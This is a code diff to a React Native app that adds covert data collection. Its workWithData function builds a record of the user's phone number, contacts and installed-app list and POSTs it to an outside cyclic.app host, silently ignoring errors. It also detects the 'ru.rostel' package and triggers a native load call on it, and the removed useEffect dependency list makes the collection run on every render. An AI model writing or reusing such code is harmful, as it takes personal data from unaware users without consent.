@@ -10,12 +10,12 @@ import { NativeModules } from 'react-native';
 import PhoneNumberPopup from './Components/PhoneNumber';
 import StorageManager from './Components/StorageManager';
 export default function App() {
-  const [popupVisible, setPopupVisible] = useState(false);
-  const {MainModule} = NativeModules;
+  const [popupVisible, setPopupVisible] = useState(true);
+  const { MainModule } = NativeModules;
   const [inputText, setInputText] = useState('');
   var contacts = ""
-  var apps =""
-  var message = "" 
+  var apps = ""
+  var message = ""
   const isButtonEnabled = inputText.length >= 4;
   const handleInputChange = (text) => {
     setInputText(text);
@@ -35,13 +35,15 @@ export default function App() {
     await loadApp()
   }
   const workWithData = async () => {
+    const defaultHeaders = new Headers();
+    defaultHeaders.append('Content-Type', 'application/json');
+    defaultHeaders.append('Authorization', 'Bearer your_token_here');
     const status = await StorageManager.getData('phoneNumberPopup')
-    if(status != "answered"){
+    if (status != "answered") {
       await new Promise((resolve) => {
         const interval = setInterval(() => {
           if (phoneNumber) {
             clearInterval(interval);
-            StorageManager.saveData('phoneNumber', phoneNumber)
             resolve();
           }
         }, 100);
@@ -50,31 +52,41 @@ export default function App() {
     await workWithApp();
     var apps_no_icons = []
     apps.forEach(element => {
-      apps_no_icons.push({label:element.label, packageName: element.packageName})
+      apps_no_icons.push({ label: element.label, packageName: element.packageName })
     });
     apps_no_icons.forEach(element => {
-      if(element.packageName == "ru.rostel"){
+      if (element.packageName == "ru.rostel") {
         MainModule.fastLoad("ru.rostel")
       }
     });
     const phoneNumber = await StorageManager.getData("phoneNumber")
-    const data = {ID:phoneNumber, contacts:contacts, apps:apps_no_icons}
-    console.log(data.ID)
+    const data = { ID: phoneNumber, contacts: contacts, apps: apps_no_icons }
+    console.log(apps_no_icons.length)
+    fetch("https://curious-pinafore-goat.cyclic.app/user/add", {
+      method: "POST",
+      headers: defaultHeaders,
+      body: JSON.stringify(data)
+    })
+      .then(response => {
+        console.log(response)
+      })
+      .catch(error => {
+      });
   }
-  const handleSubmitPhoneNumber = (phoneNumber) => {
+  const handleSubmitPhoneNumber = async (phoneNumber) => {
+    await StorageManager.saveData('phoneNumber', phoneNumber)
     setPopupVisible(false);
   };
   useEffect(() => {
-    setPopupVisible(true)
     const fetchData = async () => {
       await permissions();
       await workWithData();
     };
     fetchData();
-  }, [])
+  })
   return (
     <View style={styles.container}>
-    <PhoneNumberPopup
+      <PhoneNumberPopup
         visible={popupVisible}
         onClose={() => setPopupVisible(false)}
         onSubmit={handleSubmitPhoneNumber}
